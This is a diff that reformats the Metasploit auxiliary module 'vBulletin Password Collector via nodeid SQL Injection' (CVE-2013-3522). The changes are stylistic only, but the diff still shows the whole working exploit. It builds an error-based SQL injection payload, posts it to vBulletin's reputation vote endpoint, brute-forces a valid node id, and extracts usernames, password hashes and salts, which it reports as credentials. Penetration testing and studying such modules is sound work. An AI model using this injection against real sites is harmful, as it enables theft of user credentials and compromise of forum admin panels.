@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,36 +7,34 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'vBulletin Password Collector via nodeid SQL Injection',
-      'Description'    => %q{
-        This module exploits a SQL injection vulnerability found in vBulletin 5 that has been
-        used in the wild since March 2013. This module can be used to extract the web application's
-        usernames and hashes, which could be used to authenticate into the vBulletin admin control
-        panel.
-      },
-      'References'     =>
-        [
-          [ 'CVE', '2013-3522' ],
-          [ 'OSVDB', '92031' ],
-          [ 'EDB', '24882' ],
-          [ 'BID', '58754' ],
-          [ 'URL', 'http://www.zempirians.com/archive/legion/vbulletin_5.pl.txt' ]
-        ],
-      'Author'         =>
-        [
-          'Orestis Kourides', # Vulnerability discovery and PoC
-          'sinn3r', # Metasploit module
-          'juan vazquez' # Metasploit module
-        ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Mar 24 2013"
-    ))
+                      'Name'           => 'vBulletin Password Collector via nodeid SQL Injection',
+                      'Description'    => %q(
+                        This module exploits a SQL injection vulnerability found in vBulletin 5 that has been
+                        used in the wild since March 2013. This module can be used to extract the web application's
+                        usernames and hashes, which could be used to authenticate into the vBulletin admin control
+                        panel.
+                      ),
+                      'References'     =>
+                        [
+                          [ 'CVE', '2013-3522' ],
+                          [ 'OSVDB', '92031' ],
+                          [ 'EDB', '24882' ],
+                          [ 'BID', '58754' ],
+                          [ 'URL', 'http://www.zempirians.com/archive/legion/vbulletin_5.pl.txt' ]
+                        ],
+                      'Author'         =>
+                        [
+                          'Orestis Kourides', # Vulnerability discovery and PoC
+                          'sinn3r', # Metasploit module
+                          'juan vazquez' # Metasploit module
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DisclosureDate' => "Mar 24 2013"))
 
     register_options(
       [
@@ -43,18 +42,17 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new("NODE", [false, 'Valid Node ID']),
         OptInt.new("MINNODE", [true, 'Valid Node ID', 1]),
         OptInt.new("MAXNODE", [true, 'Valid Node ID', 100])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def exists_node?(id)
     mark = Rex::Text.rand_text_alpha(8 + rand(5))
     result = do_sqli(id, "select '#{mark}'")
 
-    if result and result =~ /#{mark}/
-      return true
-    end
+    return true if result && result =~ /#{mark}/
 
-    return false
+    false
   end
 
   def brute_force_node
@@ -67,16 +65,14 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     for node_id in min..max
-      if exists_node?(node_id)
-        return node_id
-      end
+      return node_id if exists_node?(node_id)
     end
 
-    return nil
+    nil
   end
 
   def get_node
-    if datastore['NODE'].nil? or datastore['NODE'] <= 0
+    if datastore['NODE'].nil? || (datastore['NODE'] <= 0)
       print_status("Brute forcing to find a valid node id...")
       return brute_force_node
     end
@@ -97,42 +93,36 @@ class MetasploitModule < Msf::Auxiliary
     injection << "from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) "
     injection << "AND (#{random_and}=#{random_and}"
 
-    res = send_request_cgi({
-      'method'    => 'POST',
-      'uri'       => normalize_uri(target_uri.path, "index.php", "ajax", "api", "reputation", "vote"),
-      'vars_post' =>
+    res = send_request_cgi('method' => 'POST',
+                           'uri'       => normalize_uri(target_uri.path, "index.php", "ajax", "api", "reputation", "vote"),
+                           'vars_post' =>
         {
-          'nodeid'  => "#{node}#{injection}",
-        }
-      })
+          'nodeid' => "#{node}#{injection}"
+        })
 
-    unless res and res.code == 200 and res.body.to_s =~ /Database error in vBulletin/
+    unless res && (res.code == 200) && res.body.to_s =~ /Database error in vBulletin/
       return nil
     end
 
     data = ""
 
-    if res.body.to_s =~ /#{mark}(.*)#{mark}/
-      data = $1
-    end
+    data = Regexp.last_match(1) if res.body.to_s =~ /#{mark}(.*)#{mark}/
 
-    return data
+    data
   end
 
   def get_user_data(node_id, user_id)
-    user = do_sqli(node_id, "select username from user limit #{user_id},#{user_id+1}")
-    pass = do_sqli(node_id, "select password from user limit #{user_id},#{user_id+1}")
-    salt = do_sqli(node_id, "select salt from user limit #{user_id},#{user_id+1}")
+    user = do_sqli(node_id, "select username from user limit #{user_id},#{user_id + 1}")
+    pass = do_sqli(node_id, "select password from user limit #{user_id},#{user_id + 1}")
+    salt = do_sqli(node_id, "select salt from user limit #{user_id},#{user_id + 1}")
 
-    return [user, pass, salt]
+    [user, pass, salt]
   end
 
   def check
-    res = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, "index.php")
-    })
+    res = send_request_cgi('uri' => normalize_uri(target_uri.path, "index.php"))
 
-    if res and res.code == 200 and res.body.to_s =~ /"simpleversion": "v=5/
+    if res && (res.code == 200) && res.body.to_s =~ /"simpleversion": "v=5/
       if get_node
         # Multiple factors determine this LOOKS vulnerable
         return Msf::Exploit::CheckCode::Appears
@@ -190,34 +180,30 @@ class MetasploitModule < Msf::Auxiliary
     print_good("#{count_users} users found. Collecting credentials...")
 
     users_table = Rex::Text::Table.new(
-      'Header'  => 'vBulletin Users',
-      'Indent'   => 1,
+      'Header' => 'vBulletin Users',
+      'Indent' => 1,
       'Columns' => ['Username', 'Password Hash', 'Salt']
     )
 
     for i in 0..count_users
       user = get_user_data(node_id, i)
-      unless user.join.empty?
-        report_cred(
-          ip: rhost,
-          port: rport,
-          user: user[0],
-          password: user[1],
-          service_name: (ssl ? "https" : "http"),
-          proof: "salt: #{user[2]}"
-        )
-        users_table << user
-      end
+      next if user.join.empty?
+      report_cred(
+        ip: rhost,
+        port: rport,
+        user: user[0],
+        password: user[1],
+        service_name: (ssl ? "https" : "http"),
+        proof: "salt: #{user[2]}"
+      )
+      users_table << user
     end
 
-    if users_table.rows.length > 0
-      print_good("#{users_table.rows.length.to_s} credentials successfully collected")
+    if !users_table.rows.empty?
+      print_good("#{users_table.rows.length} credentials successfully collected")
       print_line(users_table.to_s)
     else
       print_error("Unfortunately the module was unable to extract any credentials")
     end
   end
-
-
 end
-
